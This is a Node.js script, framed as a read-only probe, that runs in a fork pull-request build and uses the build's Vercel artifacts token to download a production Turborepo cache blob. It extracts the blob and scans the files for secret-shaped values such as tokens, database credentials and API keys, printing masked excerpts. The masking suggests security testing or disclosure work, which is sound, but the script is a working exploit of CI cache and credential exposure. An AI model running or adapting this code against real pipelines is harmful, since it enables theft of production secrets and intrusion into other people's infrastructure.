// Read-only probe: can a fork-PR build fetch the production Turborepo cache blob?
// Prints only masked excerpts - no secret value is ever printed in full.
const fs = require("node:fs");
const { spawnSync } = require("node:child_process");

const TOKEN = process.env.VERCEL_ARTIFACTS_TOKEN || "";
const HASH = "ba550ee1a2854e7e"; // @ct3a/www#build, computed offline from a clone of main

function mask(s) {
  s = String(s);
  return s.length <= 8 ? s : s.slice(0, 4) + "…" + s.length;
}
function redact(text) {
  return text.replace(/[A-Za-z0-9_\-]{16,}/g, (m) => (/[0-9]/.test(m) && /[A-Za-z]/.test(m) ? mask(m) : m));
}

console.log("== blob probe ==");
console.log("env=" + (process.env.VERCEL_ENV || "?") + " region=" + (process.env.VERCEL_REGION || "?"));

if (!TOKEN) { console.log("no VERCEL_ARTIFACTS_TOKEN in this build (CI run)"); process.exit(0); }

let claims = {};
try {
  claims = JSON.parse(Buffer.from(TOKEN.split(".")[1], "base64").toString("utf8"));
} catch (e) { console.log("token not a JWT:", e.message); }
const summary = {};
for (const [k, v] of Object.entries(claims)) {
  if (Array.isArray(v)) summary[k] = v.join(",");
  else if (typeof v === "string") summary[k] = mask(v);
  else summary[k] = v;
}
console.log("token claims: " + JSON.stringify(summary));

const team = claims.teamId || claims.team_id || claims.team || "";
const region = process.env.VERCEL_REGION || "iad1";
const hosts = [];
for (const h of ["api-" + region + ".vercel.com", "api-sfo1.vercel.com", "api-iad1.vercel.com", "api-fra1.vercel.com"]) {
  if (!hosts.includes(h)) hosts.push(h);
}

let got = null;
for (const h of hosts) {
  const url = "https://" + h + "/v8/artifacts/" + HASH + "?teamId=" + team;
  const r = spawnSync("curl", ["-s", "-o", "/tmp/t3blob.bin", "-w", "%{http_code} %{size_download}",
    "-H", "Authorization: Bearer " + TOKEN, url], { encoding: "utf8", timeout: 30000 });
  console.log("GET " + h + " -> " + (r.stdout || r.error));
  if (/^200/.test(r.stdout || "")) { got = { host: h, bytes: Number((r.stdout || "").split(" ")[1]) }; break; }
}

if (!got) {
  const body = JSON.stringify({ [HASH]: { size: 1, taskDurationMs: 0 } });
  const r = spawnSync("curl", ["-s", "-X", "POST", "-H", "Authorization: Bearer " + TOKEN,
    "-H", "Content-Type: application/json", "-d", body,
    "https://api-" + region + ".vercel.com/v8/artifacts?teamId=" + team], { encoding: "utf8", timeout: 30000 });
  console.log("POST oracle -> " + String(r.stdout).slice(0, 200));
  process.exit(0);
}
console.log("blob: " + got.bytes + " bytes from " + got.host);

const raw = fs.readFileSync("/tmp/t3blob.bin");
console.log("magic: " + raw.slice(0, 4).toString("hex") + " (zstd = 28b52ffd)");
const dz = spawnSync("zstd", ["-dc", "/tmp/t3blob.bin"], { timeout: 30000 });
if (dz.status !== 0) { console.log("zstd failed: " + String(dz.stderr).slice(0, 150)); process.exit(0); }
fs.writeFileSync("/tmp/t3blob.tar", dz.stdout);
console.log("decompressed: " + dz.stdout.length + " bytes");

const l = spawnSync("tar", ["-lvf", "/tmp/t3blob.tar"], { encoding: "utf8", timeout: 30000 });
console.log("files:\n" + String(l.stdout || l.stderr).split("\n").slice(0, 30).join("\n"));

spawnSync("mkdir", ["-p", "/tmp/t3x"]);
const x = spawnSync("tar", ["-x", "-C", "/tmp/t3x", "-f", "/tmp/t3blob.tar"], { encoding: "utf8", timeout: 60000 });
if (x.status !== 0) { console.log("extract failed: " + String(x.stderr).slice(0, 150)); process.exit(0); }

const listing = spawnSync("find", ["/tmp/t3x", "-type", "f"], { encoding: "utf8", timeout: 30000 }).stdout.trim().split("\n");
console.log("extracted " + listing.length + " files");
for (const f of listing.slice(0, 60)) {
  let buf = "";
  try { buf = fs.readFileSync(f).toString("utf8"); } catch (e) { continue; }
  const rel = f.replace("/tmp/t3x/", "");
  const hits = [];
  for (const line of buf.split("\n")) {
    const m = line.match(/([A-Za-z0-9_]{3,})\s*=\s*([A-Za-z0-9_\-.]{12,})/);
    if (m && /SECRET|TOKEN|KEY|PASS|AUTH|CANARY|PROD|CLOUDFLARE|PLANETSCALE|CLERK|DATABASE/i.test(m[1])) {
      hits.push(m[1] + "=" + mask(m[2]));
    }
  }
  console.log("--- " + rel + " (" + buf.length + " chars)");
  if (hits.length) console.log("  secret-shaped: " + hits.slice(0, 10).join(" | "));
  console.log("  head: " + redact(buf.replace(/\s+/g, " ").slice(0, 240)));
}
